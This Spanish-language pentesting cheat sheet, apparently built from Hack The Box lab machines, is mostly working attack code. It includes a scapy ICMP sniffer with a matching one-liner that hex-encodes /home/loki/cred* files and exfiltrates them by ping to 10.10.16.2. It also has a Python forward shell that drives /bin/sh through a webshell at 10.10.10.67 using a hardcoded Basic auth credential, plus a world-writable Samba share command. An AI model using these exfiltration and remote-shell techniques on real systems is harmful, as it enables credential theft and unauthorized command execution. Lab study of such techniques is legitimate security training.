# EXTRA

## Exfiltración de datos por ICMP

### Sniffer

```python
#!/usr/bin/python3

from scapy.all import *
import sys, signal

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
interface = 'tun0'

def data_parser(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].type == 8:
            data = packet[ICMP].load[-4:].decode("utf-8")
            print(data, flush=True, end='')
    

if __name__ == '__main__': # xxd -p -c 4 /etc/hosts | while read i; do echo $i | xxd -ps -r; done

    sniff(iface=interface, prn=data_parser)
```

### Comando a ejecutar

```null
command=xxd -p -c 4 /home/loki/cred* | while read i; do ping -c 1 -p $i 10.10.16.2; done
```

## Obtención ACLs

```null
loki@Mischief:~$ getfacl /bin/su 
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```

## Compartir recurso SAMBA

```null
service smbd start
```

```null
net usershare add shared $(pwd) '' 'Everyone:F' 'guest_ok=y'
```

## Uso de authbind

En caso de no disponer el privilegio para abrir ciertos puertos, se puede utilizar este comando si hay una regla establecida

```null
atanas@kotarak-dmz:/etc/authbind/byport$ authbind python3 -m http.server 80
```

## Forward Shell Python

```python
from base64 import b64encode
from random import randrange
import requests, sys, pdb, signal

def def_handler(sig, frame):
    print("\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.67/webdav_test_inception/cmd.php?cmd="
session = randrange(1, 9999)
stdin = "/dev/shm/strin.%s" % session
stdout = "/dev/shm/stdout.%s" % session

def RunCmd(command):

    headers = {
        'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'
    }

    command = b64encode(command.encode()).decode()

    post_data = {
        'cmd': 'echo %s | base64 -d | bash' % command
    }

    r = requests.post(main_url, data=post_data, headers=headers, timeout=2)

    return r.text


def WriteCmd(command):

    headers = {
        'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'
    }

    command = b64encode(command.encode()).decode()

    post_data = {
        'cmd': 'echo %s | base64 -d > %s' % (command, stdin)
    }

    r = requests.post(main_url, data=post_data, headers=headers, timeout=2)

    return r.text

def ReadCmd(command):

    ReadOutput = """/bin/cat %s""" % stdout

    response = RunCmd(ReadOutput)

    return response

def SetupShell():
    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)

    try:
        RunCmd(NamedPipes)
    except:
        None
    
    return None

SetupShell()

if __name__ == '__main__':

    while True:
        command = input("> ")
        
        WriteCmd(command + "\n")
        response = ReadCmd(command)
        print(response)

        ClearOutput = """echo '' > %s """ % stdout
        RunCmd(ClearOutput)
```

## Solución Java 11 / 16 Error incompatibilidad

```null
update-alternatives --config java
```

